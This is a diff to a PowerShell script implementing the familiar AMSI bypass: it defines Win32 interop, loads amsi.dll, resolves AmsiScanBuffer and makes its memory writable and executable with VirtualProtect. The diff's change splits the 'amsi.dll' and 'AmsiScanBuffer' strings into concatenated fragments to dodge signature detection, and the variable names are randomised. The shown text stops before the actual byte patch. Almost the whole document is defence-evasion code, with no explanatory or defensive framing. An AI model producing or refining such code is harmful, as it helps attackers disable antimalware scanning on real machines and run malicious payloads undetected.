@@ -1,4 +1,3 @@
-
 $64d1eab2022445c8add9ddb98b4b3f3d = @"
 using System;
 using System.Runtime.InteropServices;
@@ -12,10 +11,12 @@ public class Win32 {
 }
 "@
 Add-Type -TypeDefinition $64d1eab2022445c8add9ddb98b4b3f3d -Language CSharp
+$b = "a" + "m" + "s" + "i" + "." + "d" + "l" + "l"
+$6abfe0e4869b46159cebdc75d97b094b = [Win32]::LoadLibrary($b)
+$a = "Ams" + "iS" + "can" + "Buffer"
+$cc145a30c76d4f6b892c6df7a1df7429 = [Win32]::GetProcAddress($6abfe0e4869b46159cebdc75d97b094b, $a)
 
-$6abfe0e4869b46159cebdc75d97b094b = [Win32]::LoadLibrary("amsi.dll")
-$cc145a30c76d4f6b892c6df7a1df7429 = [Win32]::GetProcAddress($6abfe0e4869b46159cebdc75d97b094b, "AmsiScanBuffer")
-
+#reg
 $7859efa123b54e78ac59f7dd2d03d18f = 0
 [Win32]::VirtualProtect($cc145a30c76d4f6b892c6df7a1df7429, [UIntPtr]::new(6), 0x40, [ref]$7859efa123b54e78ac59f7dd2d03d18f)
 
